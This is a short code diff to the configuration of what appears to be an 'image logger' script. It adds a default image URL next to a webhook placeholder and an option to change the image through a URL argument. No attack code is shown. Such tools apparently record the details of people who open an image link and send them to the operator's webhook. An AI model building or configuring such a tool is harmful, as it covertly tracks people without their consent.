@@ -13,6 +13,7 @@ __author__ = "g4bbdev ( silentgng )"
 config = {
     # BASE CONFIG #
     "webhook": "place_your_webhook_here",
+    "image": "https://th.bing.com/th/id/OIP.zAkCde4dKDWOioxOwNlZRwHaEo?rs=1&pid=ImgDetMain", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
